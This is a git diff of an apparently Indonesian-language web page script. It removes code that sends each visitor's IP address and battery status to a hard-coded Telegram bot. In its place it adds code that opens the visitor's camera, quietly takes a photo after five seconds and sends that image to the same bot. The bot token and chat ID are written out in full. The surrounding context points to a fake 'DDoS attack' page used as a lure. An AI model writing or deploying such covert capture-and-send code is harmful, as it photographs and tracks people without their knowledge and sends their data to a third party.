@@ -4,35 +4,48 @@
 const TELEGRAM_BOT_TOKEN = "8050641668:AAEytFzgrSClXd5ARv35WFjfMNXGpGA5mr4";
 const TELEGRAM_CHAT_ID = "6157377532";
 
-// Fungsi mengirim data ke bot Telegram
-function sendToTelegram(message) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+// Fungsi untuk mengirim foto ke bot Telegram
+function sendPhotoToTelegram(imageData) {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: message
-        })
+            photo: imageData
+        }),
+        headers: { "Content-Type": "application/json" }
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Photo sent successfully", data);
+    })
+    .catch(error => {
+        console.error("Error sending photo", error);
     });
 }
 
-// Ambil IP Pengguna
-fetch("https://api.ipify.org?format=json")
-    .then(response => response.json())
-    .then(data => {
-        const userIP = data.ip;
+// Meminta akses kamera dan mengambil foto
+navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
         
-        // Ambil status baterai
-        navigator.getBattery().then(battery => {
-            const batteryLevel = Math.round(battery.level * 100);
-            const chargingStatus = battery.charging ? "Charging" : "Not Charging";
-
-            // Kirim ke Telegram
-            const message = `📡 New Visitor!\nIP: ${userIP}\n🔋 Battery: ${batteryLevel}% (${chargingStatus})`;
-            sendToTelegram(message);
-        });
+        setTimeout(() => {
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+            
+            // Mengambil foto setelah beberapa detik
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Mengambil gambar dalam format data URL
+            const imageData = canvas.toDataURL("image/png");
+            sendPhotoToTelegram(imageData);
+        }, 5000); // Ambil foto setelah 5 detik
     })
-    .catch(error => console.error("Error fetching IP:", error));
+    .catch((err) => {
+        console.error("Camera access denied:", err);
+    });
 
 // Efek Serangan DDoS Palsu
 document.getElementById("ddosForm").addEventListener("submit", function (e) {
